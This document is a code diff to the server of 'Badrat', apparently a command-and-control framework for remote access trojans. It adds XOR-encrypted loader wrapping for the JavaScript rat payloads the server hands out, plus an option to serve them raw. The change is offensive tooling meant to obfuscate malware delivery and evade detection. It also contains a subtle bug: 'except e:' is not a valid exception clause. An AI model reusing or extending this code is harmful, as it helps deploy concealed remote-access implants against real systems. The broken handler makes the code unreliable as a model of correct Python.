@@ -1,5 +1,8 @@
 #!/usr/bin/env python3
 
+# import from resources/ekript.py
+from resources import ekript
+
 from flask import Flask, request, redirect
 from datetime import datetime
 from itertools import cycle
@@ -25,11 +28,13 @@ parser.add_argument("-p", "--port", help="Port to start the HTTP(S) server on", 
 parser.add_argument("-s", "--ssl", help="Start listener using HTTPS instead of HTTP (default)", default=False, action="store_true", dest="ssl")
 parser.add_argument("-v", "--verbose", help="Start Badrat in debug/verbose mode for troubleshooting", default=False, action="store_true", dest="verbose")
 parser.add_argument("-r", "--redirect", help="Website to redirect non-rat clients to", default="en.wikipedia.org/wiki/Rat", action="store", dest="redirect_url")
+parser.add_argument("-n", "--no-payload-encryption", help="Disable stager payload encryption. Serve raw payloads instead", default=False, action="store_true", dest="no_payload_encryption")
 args = parser.parse_args()
 port = args.port
 ssl = args.ssl
 verbose = args.verbose
 redirect_url = args.redirect_url
+no_payload_encryption = args.no_payload_encryption
 if(not str.startswith("http://", redirect_url) or not str.startswith("https://", redirect_url)):
     redirect_url = "http://" + redirect_url
 
@@ -159,7 +164,7 @@ def pretty_print_banner():
     $$ |  $$ | $$$$$$$ |$$ /  $$ |$$ |  \__| $$$$$$$ |  $$ |    \$$$$$$\        (    / _/    /' o O| ,_( ))___     (`
     $$ |  $$ |$$  __$$ |$$ |  $$ |$$ |      $$  __$$ |  $$ |$$\  \____$$\        ` -|   )_  /o_O_'_(  \\'    _ `\    )
     $$$$$$$  |\$$$$$$$ |\$$$$$$$ |$$ |      \$$$$$$$ |  \$$$$  |$$$$$$$  |          `"\"\"\"`            =`---<___/---'
-    \_______/  \_______| \_______|\__|       \_______|   \____/ \_______/  v1.5.6 Hostnames WOW            "`
+    \_______/  \_______| \_______|\__|       \_______|   \____/ \_______/  v1.6.6 eKirmani eKript          "`
     """
     pretty_print(banner)
 
@@ -245,8 +250,15 @@ def send_ratcode(ratID=None, ratType=None, ip_addr=None):
         try:
             fd = open(os.getcwd() + "/rats/badrat." + ratType, 'rb')
             ratcode = fd.read()
-        except:
+
+            # Added ratcode xor encryption for js payloads only -- see resources/ekript.py
+            if(not no_payload_encryption and ratType == "js"):
+                key = ekript.gen_key()
+                ratcode = ekript.make_loader_template(ekript.ekript_js(ratcode, key), key)
+
+        except e:
             pretty_print("[-] Error sending ad-hoc ratcode: No such rat exists: /rats/badrat." + ratType)
+            pretty_print(e)
             return(default_page())
 
     elif(ratID): # Spawn new rat from current rat
